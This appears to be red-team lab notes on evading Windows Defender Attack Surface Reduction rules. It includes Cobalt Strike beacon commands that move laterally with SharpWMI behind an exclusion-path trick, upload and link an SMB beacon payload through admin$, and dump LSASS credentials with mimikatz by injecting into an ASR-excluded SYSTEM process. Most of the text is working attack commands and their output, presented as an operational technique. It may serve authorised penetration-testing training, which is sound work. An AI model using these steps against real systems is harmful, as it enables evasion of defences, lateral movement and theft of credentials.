
[Attack Surface Reduction](https://docs.microsoft.com/en-us/windows/security/threat-protection/microsoft-defender-atp/attack-surface-reduction) (ASR) is a set of hardening configurations which aim to mitigate common attack techniques used by threat actors.  ASR is enforced by various components of Windows Defender, such as the WdFilter driver.  ASR is therefore not available if an AV solution other than Defender is installed and registered as the primary AV provider on a computer.

* G2Jscript (non-functional)
* Process Creations (DONE)
* Credential Stealing (DONE)

ASR Rules can be enumerated by querying ASR via the command-line.

```
PS C:\> (Get-MpPreference).AttackSurfaceReductionRules_Ids
```

Rules can also be read remotely via the `Registry.pol` file via text on the DC's SYSVOL share.

```
PS C:\> gc "\\acme.corp\SYSVOL\acme.corp\Policies\{2CA2E24F-214A-43A1-A8EE-274F708807FD}\Machine\Registry.pol"
```

# Process Creations


* Moving laterally may cause issues and be detected by ASR through alerts. This can be seen when trying to move laterally via WMIExec.
* Bypassing this can be easy, mainly involving command-line exclusions

```
beacon> execute-assembly C:\Tools\SharpWMI\SharpWMI\bin\Release\SharpWMI.exe action=exec computername=WKSTN-1 command="C:\Windows\System32\cmd.exe /c dir C:\Windows\ccmcache\ & C:\Windows\notepad.exe"
```

* Or by passing an SMB beacon into it (on the currently compromised machine) and using it as the SMB payload.

```
beacon> cd \\wkstn-1\admin$
beacon> upload C:\Payloads\smb_x64.exe
beacon> execute-assembly C:\Tools\SharpWMI\SharpWMI\bin\Release\SharpWMI.exe action=exec computername=WKSTN-1 command="C:\Windows\smb_x64.exe --path C:\Windows\ccmcache\cache"

beacon> link wkstn-1.acme.corp TSVCPIPE-8401022c-70ed-48b4-8231-7461af611337
[+] established link to child beacon: 10.10.120.101
```

# Credential Stealing (LSASS)

* An ASR rule affecting LSASS interactions (usually resulting an alert) can be present on machines with ASR enabled. Generally, this can be seen if the below error is encountered when trying to dump credentials from the LSASS process.

```
beacon> mimikatz !sekurlsa::logonpasswords
ERROR kuhl_m_sekurlsa_acquireLSA ; Modules informations
```

* This can be easily circumvented by injecting the spawnto child process functionality into an existing process that is excluded by ASR.

```
beacon> ps
3088  644           OfficeClickToRun.exe           x64   0           NT AUTHORITY\SYSTEM

beacon> mimikatz 3088 x64 sekurlsa::logonpasswords
```